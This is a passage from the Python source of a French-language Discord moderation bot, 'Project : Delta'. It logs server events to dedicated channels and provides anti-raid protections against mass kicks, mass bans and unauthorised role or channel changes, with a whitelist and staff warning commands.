        member_count = len(member.guild.members)
        message = f"Bienvenue {member.mention}, nous sommes maintenant {member_count} <a:WelcomePengu:1361709263839428608>"
        await member_count_channel.send(message)

        # Envoi d'une notification de log dans le salon spécifique du serveur
        if member.guild.id == PROJECT_DELTA:
            channel = get_log_channel(member.guild, "utilisateurs")
            if channel:
                embed = discord.Embed(
                    title="✅ Nouveau Membre",
                    description=f"{member.mention} a rejoint le serveur.",
                    color=discord.Color.green()
                )
                embed.set_thumbnail(url=member.display_avatar.url)
                embed.set_footer(text=f"ID de l'utilisateur : {member.id}")
                embed.timestamp = member.joined_at or discord.utils.utcnow()

                await channel.send(embed=embed)

kick_times = defaultdict(list)

@bot.event
async def on_member_remove(member: discord.Member):
    guild_id = str(member.guild.id)

    # Vérifier les permissions du bot avant de continuer
    if not member.guild.me.guild_permissions.view_audit_log:
        print("Le bot n'a pas la permission de voir les logs d'audit.")
        return

    # Vérifier l'événement de kick via les logs d'audit
    async for entry in member.guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
        if entry.target.id == member.id and (discord.utils.utcnow() - entry.created_at).total_seconds() < 5:
            # Récupère les données de protection
            protection_data = await get_protection_data(guild_id)

            # Si la protection anti-masskick est activée
            if protection_data.get("anti_masskick") != "activer":
                return

            author_id = entry.user.id

            # Récupérer les utilisateurs whitelistés
            whitelist_data = await collection19.find_one({"guild_id": guild_id})  # Utilisation de la collection19 pour la whitelist
            if whitelist_data and str(author_id) in whitelist_data.get("users", []):
                print(f"{entry.user.name} est dans la whitelist, action ignorée.")
                return  # Si l'auteur du kick est dans la whitelist, on ignore la protection

            current_time = time.time()

            # Enregistrer le timestamp du kick effectué par l'auteur
            kick_times[author_id].append(current_time)

            # Ne garder que les kicks effectués dans les 10 dernières secondes
            kick_times[author_id] = [t for t in kick_times[author_id] if current_time - t < 10]

            # Si 2 kicks ont été effectués en moins de 10 secondes
            if len(kick_times[author_id]) >= 2:
                try:
                    # Sanctionner l'auteur du masskick en le bannissant
                    await member.guild.ban(entry.user, reason="Masskick détecté (2 kicks en moins de 10s)")
                    await member.guild.system_channel.send(
                        f"⚠️ **Masskick détecté !** {entry.user.mention} a été banni pour avoir expulsé plusieurs membres en peu de temps."
                    )
                    print(f"[Masskick détecté] {entry.user.name} a été banni.")
                except discord.Forbidden:
                    print(f"[Erreur Masskick] Le bot n'a pas la permission de bannir {entry.user.name}.")
                except Exception as e:
                    print(f"[Erreur Masskick] : {e}")
                return  # Arrêter l'exécution si un masskick est détecté

    # Traitement du départ de membre pour un serveur spécifique (PROJECT_DELTA)
    if member.guild.id == PROJECT_DELTA:
        channel = get_log_channel(member.guild, "utilisateurs")
        if channel:
            embed = discord.Embed(
                title="❌ Départ d'un Membre",
                description=f"{member.mention} a quitté le serveur.",
                color=discord.Color.red()
            )
            embed.set_thumbnail(url=member.display_avatar.url)
            embed.set_footer(text=f"ID de l'utilisateur : {member.id}")
            embed.timestamp = discord.utils.utcnow()

            # Ajouter la durée de présence si disponible
            if member.joined_at:
                duration = discord.utils.utcnow() - member.joined_at
                days = duration.days
                hours = duration.seconds // 3600
                minutes = (duration.seconds % 3600) // 60

                formatted_duration = f"{days}j {hours}h {minutes}min"
                embed.add_field(name="Durée sur le serveur", value=formatted_duration, inline=False)

            await channel.send(embed=embed)

# --- Nickname update ---
@bot.event
async def on_user_update(before, after):
    # Check for username changes (this affects all mutual servers)
    for guild in bot.guilds:
        if guild.id == PROJECT_DELTA:
            if before.name != after.name:
                channel = get_log_channel(guild, "nicknames")
                if channel:
                    embed = discord.Embed(
                        title="📝 Changement de Pseudo Global",
                        description=f"{after.mention} a changé son pseudo global.",
                        color=discord.Color.blurple()
                    )
                    embed.add_field(name="Avant", value=f"`{before.name}`", inline=True)
                    embed.add_field(name="Après", value=f"`{after.name}`", inline=True)
                    embed.set_footer(text=f"ID de l'utilisateur : {after.id}")
                    embed.timestamp = discord.utils.utcnow()

                    await channel.send(embed=embed)

@bot.event
async def on_member_update(before, after):
    if before.guild.id != PROJECT_DELTA:  # Vérifier si c'est le bon serveur
        return

    # --- Stream logs ---
    if before.activity != after.activity:
        if after.activity and isinstance(after.activity, discord.Streaming):
            coins_to_add = random.randint(50, 75)
            add_coins(after.guild.id, str(after.id), coins_to_add)
            await after.send(f"Tu as reçu **{coins_to_add} Coins** pour ton stream !")

    # --- Nickname logs ---
    if before.nick != after.nick:
        channel = get_log_channel(before.guild, "nicknames")
        if channel:
            embed = discord.Embed(
                title="📝 Changement de Surnom",
                description=f"{before.mention} a modifié son surnom sur le serveur.",
                color=discord.Color.blue()
            )
            embed.add_field(name="Avant", value=f"`{before.nick}`" if before.nick else "*Aucun*", inline=True)
            embed.add_field(name="Après", value=f"`{after.nick}`" if after.nick else "*Aucun*", inline=True)
            embed.set_footer(text=f"ID de l'utilisateur : {after.id}")
            embed.timestamp = discord.utils.utcnow()

            await channel.send(embed=embed)

    # --- Boost du serveur ---
    if before.premium_since is None and after.premium_since is not None:
        channel = get_log_channel(before.guild, "boosts")
        if channel:
            embed = discord.Embed(
                title="💎 Nouveau Boost",
                description=f"{after.mention} a boosté le serveur !",
                color=discord.Color.green()
            )
            embed.set_thumbnail(url=after.display_avatar.url)
            embed.set_footer(text=f"ID de l'utilisateur : {after.id}")
            embed.timestamp = discord.utils.utcnow()

            await channel.send(embed=embed)

@bot.event
async def on_guild_role_create(role):
    guild_id = str(role.guild.id)
    protection_data = await get_protection_data(guild_id)

    if protection_data.get("anti_createrole") == "activer":
        # Vérifier les permissions du bot
        if not role.guild.me.guild_permissions.view_audit_log or not role.guild.me.guild_permissions.manage_roles:
            print("Le bot n'a pas les permissions nécessaires pour lire les logs ou supprimer le rôle.")
            return

        # Chercher qui a créé le rôle dans les logs d'audit
        async for entry in role.guild.audit_logs(limit=1, action=discord.AuditLogAction.role_create):
            if (discord.utils.utcnow() - entry.created_at).total_seconds() < 5:
                user = entry.user

                # Vérification de la whitelist
                whitelist_data = await collection19.find_one({"guild_id": guild_id})
                wl_ids = whitelist_data.get("users", []) if whitelist_data else []

                if str(user.id) in wl_ids:
                    print(f"[Anti-createrole] Rôle créé par {user} (whitelist). Action ignorée.")
                    return

                try:
                    await role.delete(reason="Protection anti-création de rôle activée.")
                    print(f"🔒 Le rôle {role.name} a été supprimé (créé par {user}) à cause de la protection.")

                    # Envoyer un log propre
                    log_channel = get_log_channel(role.guild, "roles")
                    if log_channel:
                        embed = discord.Embed(
                            title="🚫 Rôle Supprimé (Protection)",
                            description=f"Le rôle **{role.name}** a été supprimé car créé par **{user.mention}** alors que la protection anti-création est activée.",
                            color=discord.Color.red()
                        )
                        embed.add_field(name="ID du rôle", value=role.id, inline=False)
                        embed.add_field(name="Créateur", value=f"{user} ({user.id})", inline=False)
                        embed.timestamp = discord.utils.utcnow()
                        await log_channel.send(embed=embed)
                except discord.Forbidden:
                    print(f"[Anti-createrole] Pas les permissions pour supprimer le rôle {role.name}.")
                except Exception as e:
                    print(f"[Anti-createrole] Erreur lors de la suppression de {role.name} : {e}")
                return

    # Log classique si protection désactivée
    if role.guild.id == PROJECT_DELTA:
        log_channel = get_log_channel(role.guild, "roles")
        if log_channel:
            embed = discord.Embed(
                title="🎭 Nouveau Rôle Créé",
                description=f"Un nouveau rôle a été créé : **{role.name}**",
                color=discord.Color.purple()
            )
            embed.add_field(name="ID du Rôle", value=str(role.id), inline=False)
            embed.set_footer(text="Rôle créé sur le serveur PROJECT_DELTA")
            embed.timestamp = discord.utils.utcnow()
            try:
                await log_channel.send(embed=embed)
                print(f"Log de création de rôle envoyé pour {role.name}.")
            except Exception as e:
                print(f"Erreur lors de l'envoi du log pour le rôle {role.name} : {e}")

@bot.event
async def on_guild_role_delete(role):
    guild_id = str(role.guild.id)
    protection_data = await get_protection_data(guild_id)

    if protection_data.get("anti_deleterole") == "activer":
        if not role.guild.me.guild_permissions.view_audit_log or not role.guild.me.guild_permissions.manage_roles:
            print("Le bot n'a pas les permissions nécessaires pour cette protection.")
            return

        # Chercher qui a supprimé le rôle
        async for entry in role.guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete):
            if (discord.utils.utcnow() - entry.created_at).total_seconds() < 5:
                user = entry.user

                # Vérification de la whitelist
                whitelist_data = await collection19.find_one({"guild_id": guild_id})
                wl_ids = whitelist_data.get("users", []) if whitelist_data else []

                if str(user.id) in wl_ids:
                    print(f"[Anti-deleterole] Suppression par {user} (whitelist). Ignorée.")
                    return

                try:
                    # Recréation du rôle
                    new_role = await role.guild.create_role(
                        name=role.name,
                        permissions=role.permissions,
                        color=role.color,
                        mentionable=role.mentionable,
                        hoist=role.hoist,
                        reason="Protection anti-suppression de rôle activée."
                    )
                    print(f"🔁 Rôle {role.name} recréé suite à suppression par {user}.")

                    # Réattribution aux membres
                    for member in role.guild.members:
                        if role.id in [r.id for r in member.roles]:
                            try:
                                await member.add_roles(new_role, reason="Rôle recréé (anti-suppression)")
                                print(f"Rôle {new_role.name} réattribué à {member.name}.")
                            except Exception as e:
                                print(f"Erreur pour {member.name} : {e}")

                    # Log dans salon dédié
                    log_channel = get_log_channel(role.guild, "roles")
                    if log_channel:
                        embed = discord.Embed(
                            title="🚨 Rôle Supprimé & Recréé",
                            description=f"Le rôle **{role.name}** a été supprimé par {user.mention} et automatiquement recréé.",
                            color=discord.Color.red()
                        )
                        embed.add_field(name="Auteur", value=f"{user} ({user.id})", inline=False)
                        embed.add_field(name="ID du rôle original", value=str(role.id), inline=False)
                        embed.add_field(name="Nouveau rôle", value=f"{new_role.name} ({new_role.id})", inline=False)
                        embed.timestamp = discord.utils.utcnow()
                        await log_channel.send(embed=embed)
                except Exception as e:
                    print(f"Erreur lors de la recréation du rôle {role.name} : {e}")
                return

    # Log classique si suppression sans protection ou whitelistée
    if role.guild.id == PROJECT_DELTA:
        channel = get_log_channel(role.guild, "roles")
        if channel:
            embed = discord.Embed(
                title="🎭 Rôle Supprimé",
                description=f"Le rôle **{role.name}** a été supprimé.",
                color=discord.Color.red()
            )
            embed.add_field(name="ID du Rôle", value=str(role.id), inline=False)
            embed.set_footer(text="Rôle supprimé sur PROJECT_DELTA")
            embed.timestamp = discord.utils.utcnow()

            try:
                await channel.send(embed=embed)
                print(f"Log de suppression de rôle envoyé pour {role.name}.")
            except Exception as e:
                print(f"Erreur lors de l'envoi du log pour le rôle {role.name} : {e}")

# Logs pour les mises à jour de rôle
@bot.event
async def on_guild_role_update(before, after):
    if before.guild.id == PROJECT_DELTA:
        channel = get_log_channel(before.guild, "roles")
        if channel:
            embed = discord.Embed(
                title="🎭 Mise à Jour de Rôle",
                description=f"Le rôle **{before.name}** a été mis à jour :",
                color=discord.Color.orange()
            )
            embed.add_field(name="Avant", value=f"`{before.name}`", inline=False)
            embed.add_field(name="Après", value=f"`{after.name}`", inline=False)
            embed.add_field(name="ID du Rôle", value=str(after.id), inline=False)

            # Ajouter des informations supplémentaires, si nécessaire
            if before.permissions != after.permissions:
                embed.add_field(name="Permissions", value="Permissions modifiées", inline=False)
            
            embed.set_footer(text="Mise à jour du rôle")
            embed.timestamp = discord.utils.utcnow()

            await channel.send(embed=embed)

@bot.event
async def on_guild_channel_create(channel):
    guild_id = str(channel.guild.id)

    # Protection anti-création de salon
    protection_data = await get_protection_data(guild_id)
    if protection_data.get("anti_createchannel") == "activer":
        if not channel.guild.me.guild_permissions.view_audit_log or not channel.guild.me.guild_permissions.manage_channels:
            print("Le bot n'a pas les permissions nécessaires (audit log / gérer les salons).")
            return

        # Obtenir l'utilisateur ayant créé le salon via les logs d’audit
        async for entry in channel.guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_create):
            if (discord.utils.utcnow() - entry.created_at).total_seconds() < 5:
                user = entry.user

                # Vérifier s’il est dans la whitelist
                whitelist_data = await collection19.find_one({"guild_id": guild_id})
                wl_ids = whitelist_data.get("users", []) if whitelist_data else []

                if str(user.id) in wl_ids:
                    print(f"{user} est dans la whitelist, création de salon ignorée.")
                    return  # Ne rien faire s'il est dans la whitelist

                # Supprimer le salon
                try:
                    await channel.delete(reason="Protection anti-création de salon activée.")
                    print(f"Le salon {channel.name} a été supprimé (créé par {user}).")

                    # Log dans le salon prévu
                    log_channel = get_log_channel(channel.guild, "channels")
                    if log_channel:
                        embed = discord.Embed(
                            title="⚠️ Salon supprimé",
                            description=f"Le salon **{channel.name}** créé par **{user.mention}** a été supprimé (anti-create).",
                            color=discord.Color.red()
                        )
                        embed.add_field(name="ID du Salon", value=str(channel.id), inline=False)
                        embed.set_footer(text=f"Créé par : {user} ({user.id})")
                        embed.timestamp = discord.utils.utcnow()
                        await log_channel.send(embed=embed)
                except Exception as e:
                    print(f"Erreur lors de la suppression du salon ou de l’envoi du log : {e}")
                return

    # Log de création si la protection n’est pas activée
    if channel.guild.id == PROJECT_DELTA:
        channel_log = get_log_channel(channel.guild, "channels")
        if channel_log:
            embed = discord.Embed(
                title="🗂️ Nouveau Salon Créé",
                description=f"Le salon **{channel.name}** a été créé.",
                color=discord.Color.blue()
            )
            embed.add_field(name="ID du Salon", value=str(channel.id), inline=False)
            embed.set_footer(text="Salon créé sur le serveur PROJECT_DELTA")
            embed.timestamp = discord.utils.utcnow()

            try:
                await channel_log.send(embed=embed)
            except Exception as e:
                print(f"Erreur lors du log de création de salon : {e}")

@bot.event
async def on_guild_channel_delete(channel):
    guild_id = str(channel.guild.id)

    protection_data = await get_protection_data(guild_id)
    if protection_data.get("anti_deletechannel") == "activer":
        # Vérifier les permissions nécessaires
        if not channel.guild.me.guild_permissions.view_audit_log or not channel.guild.me.guild_permissions.manage_channels:
            print("Le bot n'a pas les permissions nécessaires pour lire les logs ou recréer le salon.")
            return

        # Récupération de l'auteur de la suppression via audit logs
        async for entry in channel.guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
            if (discord.utils.utcnow() - entry.created_at).total_seconds() < 5:
                user = entry.user

                # Vérifier la whitelist
                whitelist_data = await collection19.find_one({"guild_id": guild_id})
                wl_ids = whitelist_data.get("users", []) if whitelist_data else []

                if str(user.id) in wl_ids:
                    print(f"[Anti-deletechannel] Salon supprimé par {user} (whitelist). Action ignorée.")
                    return  # Ne rien faire s’il est whitelisté

                # Recréer le salon supprimé
                try:
                    new_channel = await channel.guild.create_text_channel(
                        name=channel.name,
                        category=channel.category,
                        reason="Protection anti-suppression de salon activée."
                    )
                    print(f"🔒 Salon {channel.name} recréé suite à la suppression par {user}.")

                    # Recréer les permissions
                    for target, overwrite in channel.overwrites.items():
                        await new_channel.set_permissions(target, overwrite=overwrite)

                    # Envoyer un log
                    log_channel = get_log_channel(channel.guild, "channels")
                    if log_channel:
                        embed = discord.Embed(
                            title="🚨 Salon recréé (anti-delete)",
                            description=f"Le salon **{channel.name}** a été recréé suite à une suppression non autorisée par **{user.mention}**.",
                            color=discord.Color.orange()
                        )
                        embed.add_field(name="Utilisateur", value=f"{user} ({user.id})", inline=False)
                        embed.add_field(name="ID du salon original", value=str(channel.id), inline=False)
                        embed.timestamp = discord.utils.utcnow()
                        await log_channel.send(embed=embed)
                except Exception as e:
                    print(f"[Erreur Anti-deletechannel] Erreur lors de la recréation ou du log : {e}")
                return

    # Log normal de suppression si protection non activée
    if channel.guild.id == PROJECT_DELTA:
        channel_log = get_log_channel(channel.guild, "channels")
        if channel_log:
            embed = discord.Embed(
                title="🗂️ Salon Supprimé",
                description=f"Le salon **{channel.name}** a été supprimé.",
                color=discord.Color.red()
            )
            embed.add_field(name="ID du Salon", value=str(channel.id), inline=False)
            embed.set_footer(text="Salon supprimé sur le serveur PROJECT_DELTA")
            embed.timestamp = discord.utils.utcnow()

            try:
                await channel_log.send(embed=embed)
                print(f"Log de suppression envoyé pour {channel.name}.")
            except Exception as e:
                print(f"Erreur lors de l'envoi du log pour la suppression : {e}")

# Log de la mise à jour de salon dans le serveur PROJECT_DELTA
@bot.event
async def on_guild_channel_update(before, after):
    if before.guild.id == PROJECT_DELTA:
        # Ignorer si c'est l'admin (toi) qui modifie le salon
        if before.guild.me.id == after.guild.me.id:
            return
        
        # Récupérer le salon de log pour les channels
        channel_log = get_log_channel(before.guild, "channels")
        if channel_log:
            embed = discord.Embed(
                title="🗂️ Mise à Jour de Salon",
                description=f"Le salon **{before.name}** a été mis à jour.",
                color=discord.Color.orange()
            )
            embed.add_field(name="Avant", value=f"`{before.name}`", inline=False)
            embed.add_field(name="Après", value=f"`{after.name}`", inline=False)

            # Log de modifications supplémentaires (comme les permissions, la description, etc.)
            if before.topic != after.topic:
                embed.add_field(name="Description", value=f"Avant : {before.topic if before.topic else 'Aucune'}\nAprès : {after.topic if after.topic else 'Aucune'}", inline=False)
            if before.position != after.position:
                embed.add_field(name="Position", value=f"Avant : {before.position}\nAprès : {after.position}", inline=False)

            embed.set_footer(text="Mise à jour du salon sur PROJECT_DELTA")
            embed.timestamp = discord.utils.utcnow()

            await channel_log.send(embed=embed)


# --- Voice state update ---
@bot.event
async def on_voice_state_update(member, before, after):
    if member.guild.id == PROJECT_DELTA:
        channel = get_log_channel(member.guild, "vocal")
        if channel:
            embed = discord.Embed(
                title="🎙️ Changement d'État Vocal",
                description=f"Changement d'état vocal pour {member.mention}",
                color=discord.Color.blue()
            )
            embed.set_footer(text="Logs des salons vocaux")
            embed.timestamp = discord.utils.utcnow()

            if after.channel:
                embed.add_field(name="Rejoint le salon vocal", value=f"{after.channel.name}", inline=False)
            if before.channel:
                embed.add_field(name="Quitte le salon vocal", value=f"{before.channel.name}", inline=False)

            await channel.send(embed=embed)

# --- Guild update ---
@bot.event
async def on_guild_update(before, after):
    if before.id == PROJECT_DELTA:
        channel = get_log_channel(after, "serveur")  # Assurez-vous que 'after' est le bon paramètre pour obtenir le canal
        if channel:
            embed = discord.Embed(
                title="⚙️ Mise à Jour du Serveur",
                description="Des modifications ont été apportées au serveur.",
                color=discord.Color.green()
            )
            embed.add_field(name="Nom du Serveur", value=f"{before.name} → {after.name}", inline=False)

            # Ajouter d'autres modifications si nécessaires (par exemple, les icônes ou les paramètres de vérification)
            if before.icon != after.icon:
                embed.add_field(name="Icône du Serveur", value="L'icône a été changée.", inline=False)

            if before.verification_level != after.verification_level:
                embed.add_field(name="Niveau de vérification", value=f"Avant : {before.verification_level}\nAprès : {after.verification_level}", inline=False)

            embed.set_footer(text="Mise à jour du serveur PROJECT_DELTA")
            embed.timestamp = discord.utils.utcnow()

            await channel.send(embed=embed)

# --- Webhooks update ---
@bot.event
async def on_webhooks_update(guild, channel):
    if guild.id == PROJECT_DELTA:
        webhook_channel = get_log_channel(guild, "webhooks")
        if webhook_channel:
            embed = discord.Embed(
                title="🛰️ Mise à Jour des Webhooks",
                description=f"Les webhooks ont été mis à jour dans le salon **{channel.name}**.",
                color=discord.Color.purple()
            )
            embed.add_field(name="Nom du Salon", value=channel.name, inline=False)
            embed.add_field(name="ID du Salon", value=str(channel.id), inline=False)
            embed.set_footer(text="Mise à jour des webhooks")
            embed.timestamp = discord.utils.utcnow()

            await webhook_channel.send(embed=embed)

@bot.event
async def on_member_ban(guild, user):
    guild_id = str(guild.id)
    data = await get_protection_data(guild_id)

    # Récupérer les utilisateurs whitelistés
    whitelist_data = await collection19.find_one({"guild_id": guild_id})  # Utilisation de la collection19 pour la whitelist
    if whitelist_data and str(user.id) in whitelist_data.get("users", []):
        print(f"{user.name} est dans la whitelist, action ignorée.")
        return  # Si l'utilisateur est dans la whitelist, on ignore la protection

    if data.get("anti_massban") == "activer":  # Vérifie si la protection anti-massban est activée
        if guild.id not in ban_times:
            ban_times[guild.id] = []
        if guild.id not in banned_by_user:
            banned_by_user[guild.id] = {}

        current_time = time.time()
        ban_times[guild.id].append(current_time)

        # Ne garder que les bans des 10 dernières secondes
        ban_times[guild.id] = [t for t in ban_times[guild.id] if current_time - t < 10]

        # Si plus de 2 bans ont été effectués en moins de 10 secondes
        if len(ban_times[guild.id]) > 2:
            # Enregistrement des bans effectués par l'utilisateur
            if user.id not in banned_by_user[guild.id]:
                banned_by_user[guild.id][user.id] = []

            banned_by_user[guild.id][user.id].append(current_time)

            # Ne garder que les bans des 10 dernières secondes
            banned_by_user[guild.id][user.id] = [t for t in banned_by_user[guild.id][user.id] if current_time - t < 10]

            # Révoquer les bans
            for ban_time in banned_by_user[guild.id][user.id]:
                try:
                    await guild.unban(user)
                    log_channel = guild.system_channel or next((c for c in guild.text_channels if c.permissions_for(guild.me).send_messages), None)
                    if log_channel:
                        await log_channel.send(f"🚨 Massban détecté ! Tous les bans effectués par **{user.name}** ont été annulés.")
                    print(f"Massban détecté pour {user.name}, bans annulés.")
                except discord.Forbidden:
                    print(f"Erreur : Le bot n'a pas la permission d'annuler les bans de {user.name}.")
                except Exception as e:
                    print(f"Erreur lors de l’annulation du massban : {e}")

            # Kick de la personne qui a effectué le massban
            try:
                await user.kick(reason="Massban détecté et sanctionné")
                log_channel = guild.system_channel or next((c for c in guild.text_channels if c.permissions_for(guild.me).send_messages), None)
                if log_channel:
                    await log_channel.send(f"🚨 **{user.name}** a été kické pour avoir effectué un massban.")
                print(f"{user.name} a été kické pour massban.")
            except discord.Forbidden:
                print(f"Erreur : Le bot n'a pas la permission de kicker {user.name}.")
            except Exception as e:
                print(f"Erreur lors du kick de {user.name} : {e}")

    # --- Logs de ban pour PROJECT_DELTA ---
    if guild.id == PROJECT_DELTA:
        channel = get_log_channel(guild, "sanctions")
        if channel:
            embed = discord.Embed(
                title="🔨 Membre Banni",
                description=f"Le membre **{user.mention}** a été banni du serveur.",
                color=discord.Color.red()
            )
            embed.add_field(name="ID du Membre", value=str(user.id), inline=False)
            embed.set_footer(text="Ban sur PROJECT_DELTA")
            embed.timestamp = discord.utils.utcnow()

            await channel.send(embed=embed)

# --- Logs de débannissement ---
@bot.event
async def on_member_unban(guild, user):
    if guild.id == PROJECT_DELTA:
        channel = get_log_channel(guild, "sanctions")
        if channel:
            embed = discord.Embed(
                title="🔓 Membre Débanni",
                description=f"Le membre **{user.mention}** a été débanni du serveur.",
                color=discord.Color.green()
            )
            embed.add_field(name="ID du Membre", value=str(user.id), inline=False)
            embed.set_footer(text="Débannissement sur PROJECT_DELTA")
            embed.timestamp = discord.utils.utcnow()

            await channel.send(embed=embed)

# --- Bot logs ---
@bot.event
async def on_guild_update(before, after):
    if before.id == PROJECT_DELTA:
        bot_channel = get_log_channel(after, "bots")
        if bot_channel:
            embed = discord.Embed(
                title="🤖 Mise à Jour du Serveur",
                description=f"Le serveur **{before.name}** a été mis à jour.",
                color=discord.Color.blue()
            )
            embed.add_field(name="Nom du Serveur", value=f"{before.name} → {after.name}", inline=False)

            # Ajouter d'autres informations si nécessaire
            if before.icon != after.icon:
                embed.add_field(name="Icône du Serveur", value="L'icône a été changée.", inline=False)

            embed.set_footer(text="Mise à jour du serveur sur PROJECT_DELTA")
            embed.timestamp = discord.utils.utcnow()

            await bot_channel.send(embed=embed)

#-------------------------------------------------------------------------- Bot Join:
@bot.event
async def on_guild_join(guild):
    channel_id = 1361304582424232037  # ID du salon cible
    channel = bot.get_channel(channel_id)

    if channel is None:
        # Si le bot ne trouve pas le salon (peut-être parce qu’il n’est pas dans le cache)
        channel = await bot.fetch_channel(channel_id)

    total_guilds = len(bot.guilds)
    total_users = sum(g.member_count for g in bot.guilds)

    isey_embed = discord.Embed(
        title="✨ Nouveau serveur rejoint !",
        description=f"Le bot a été ajouté sur un nouveau serveur.",
        color=discord.Color.green(),
        timestamp=datetime.utcnow()
    )
    isey_embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
    isey_embed.add_field(name="📛 Nom", value=guild.name, inline=True)
    isey_embed.add_field(name="🆔 ID", value=guild.id, inline=True)
    isey_embed.add_field(name="👥 Membres", value=str(guild.member_count), inline=True)
    isey_embed.add_field(name="👑 Propriétaire", value=str(guild.owner), inline=True)
    isey_embed.add_field(name="🌍 Région", value=guild.preferred_locale, inline=True)
    isey_embed.add_field(name="🔢 Total serveurs", value=str(total_guilds), inline=True)
    isey_embed.add_field(name="🌐 Utilisateurs totaux (estimation)", value=str(total_users), inline=True)
    isey_embed.set_footer(text="Ajouté le")

    await channel.send(embed=isey_embed)

    # --- Embed public pour le salon du serveur ---
    text_channels = [channel for channel in guild.text_channels if channel.permissions_for(guild.me).send_messages]
    
    if text_channels:
        top_channel = sorted(text_channels, key=lambda x: x.position)[0]

        public_embed = discord.Embed(
            title="🎉 **Bienvenue sur le serveur !** 🎉",
            description="Salut à tous ! Je suis **Project : Delta**, votre assistant virtuel ici pour rendre votre expérience sur ce serveur **inoubliable** et pleine d'interactions ! 😎🚀",
            color=discord.Color.blurple()
        )

        public_embed.set_thumbnail(url="https://github.com/Iseyg91/KNSKS-ET/blob/main/IMAGES%20Delta/ea259e01-aa5c-4f7b-82fd-0c4e45bc2499%20(1).png?raw=true")
        public_embed.set_image(url="https://github.com/Iseyg91/KNSKS-ET/blob/main/IMAGES%20Delta/uri_ifs___M_a08ff46b-5005-4ddb-86d9-a73f638d5cf2.jpg?raw=true")
        public_embed.set_footer(text=f"Bot rejoint le serveur {guild.name}!", icon_url="https://github.com/Iseyg91/KNSKS-Q/blob/main/3e3bd3c24e33325c7088f43c1ae0fadc.png?raw=true")

        public_embed.add_field(name="🔧 **Que puis-je faire pour vous ?**", value="Je propose des **commandes pratiques** pour gérer les serveurs, détecter les mots sensibles, et bien plus encore ! 👾🎮", inline=False)
        public_embed.add_field(name="💡 **Commandes principales**", value="📜 Voici les commandes essentielles pour bien commencer :\n`+help` - Afficher toutes les commandes disponibles\n`+vc` - Voir les statistiques du serveur\n`+setup` - Configurer le bot selon vos besoins", inline=False)
        public_embed.add_field(name="🚀 **Prêt à commencer ?**", value="Tapez `+aide` pour voir toutes les commandes disponibles ou dites-moi ce que vous souhaitez faire. Si vous avez des questions, je suis là pour vous aider ! 🎉", inline=False)
        public_embed.add_field(name="🌐 **Serveurs utiles**", value="**[Serveur de Support](https://discord.com/invite/PzTHvVKDxN)**\n**[Serveur Etherya](https://discord.com/invite/tVVYC2Ynfy)**", inline=False)

        await top_channel.send(embed=public_embed)

@bot.event
async def on_guild_remove(guild):
    channel_id = 1361306217460531225  # ID du salon cible
    channel = bot.get_channel(channel_id)

    if channel is None:
        channel = await bot.fetch_channel(channel_id)

    # Total après le départ
    total_guilds = len(bot.guilds)
    total_users = sum(g.member_count for g in bot.guilds if g.member_count)

    embed = discord.Embed(
        title="💔 Serveur quitté",
        description="Le bot a été retiré d’un serveur.",
        color=discord.Color.red(),
        timestamp=datetime.utcnow()
    )
    embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
    embed.add_field(name="📛 Nom", value=guild.name, inline=True)
    embed.add_field(name="🆔 ID", value=guild.id, inline=True)
    embed.add_field(name="👥 Membres lors du départ", value=str(guild.member_count), inline=True)
    embed.add_field(name="👑 Propriétaire", value=str(guild.owner), inline=True)
    embed.add_field(name="🌍 Région", value=guild.preferred_locale, inline=True)

    # Infos globales
    embed.add_field(name="🔢 Total serveurs restants", value=str(total_guilds), inline=True)
    embed.add_field(name="🌐 Utilisateurs totaux (estimation)", value=str(total_users), inline=True)

    embed.set_footer(text="Retiré le")

    await channel.send(embed=embed)

# Fonction pour vérifier si l'utilisateur est administrateur
async def is_admin(interaction: discord.Interaction):
    # Utilisation de interaction.user pour accéder aux permissions
    return interaction.user.guild_permissions.administrator

#---------------------------------------------------------------------------- Staff Project : Delta:

# Vérifie si l'utilisateur est staff sur PROJECT_DELTA
def is_staff(ctx):
    guild = bot.get_guild(PROJECT_DELTA)
    if not guild:
        return False
    member = guild.get_member(ctx.author.id)
    if not member:
        return False
    return any(role.id == STAFF_DELTA for role in member.roles)

# Vérifie si la cible est un admin sur PROJECT_DELTA
async def is_target_protected(user_id: int):
    guild = bot.get_guild(PROJECT_DELTA)
    if not guild:
        return False
    member = guild.get_member(user_id)
    if not member:
        return False
    return any(role.permissions.administrator for role in member.roles)

# AVERTISSEMENT
@bot.hybrid_command(name="delta-warn", description="Avertir un utilisateur")
async def delta_warn(ctx, member: discord.Member, *, reason: str):
    if not is_staff(ctx):
        return await ctx.reply("Tu n'as pas la permission d'utiliser cette commande.")
    
    if await is_target_protected(member.id):
        return await ctx.reply("Tu ne peux pas warn cet utilisateur.")

    collection24.insert_one({
        "user_id": str(member.id),
        "moderator_id": str(ctx.author.id),
        "reason": reason,
        "timestamp": datetime.utcnow()
    })

    try:
        await member.send(f"🚨 Tu as reçu un **avertissement** sur **Project : Delta**.\n**Raison :** `{reason}`")
    except:
        pass

    embed = discord.Embed(
        title="📌 Avertissement appliqué",
        description=f"{member.mention} a été averti.",
        color=discord.Color.orange()
    )
    embed.add_field(name="👮 Modérateur", value=ctx.author.mention, inline=True)
    embed.add_field(name="💬 Raison", value=reason, inline=False)
    embed.timestamp = datetime.utcnow()
    await ctx.reply(embed=embed)

    log_channel = bot.get_channel(WARN_LOG_CHANNEL)
    if log_channel:
        await log_channel.send(embed=embed)

# RETRAIT AVERTISSEMENT
@bot.hybrid_command(name="delta-unwarn", description="Retirer un avertissement")
async def delta_unwarn(ctx, member: discord.Member, *, reason: str):
    if not is_staff(ctx):
        return await ctx.reply("Tu n'as pas la permission d'utiliser cette commande.")

    warn = collection24.find_one_and_delete({"user_id": str(member.id)})
    if warn:
        try:
            await member.send(f"✅ Ton **avertissement** sur **Project : Delta** a été retiré.\n**Raison :** `{reason}`")
        except:
            pass

        embed = discord.Embed(
            title="✅ Avertissement retiré",
            description=f"{member.mention} n'est plus averti.",
            color=discord.Color.green()
        )
        embed.add_field(name="👮 Modérateur", value=ctx.author.mention, inline=True)
        embed.add_field(name="💬 Raison", value=reason, inline=False)
        embed.timestamp = datetime.utcnow()
        await ctx.reply(embed=embed)

        log_channel = bot.get_channel(UNWARN_LOG_CHANNEL)
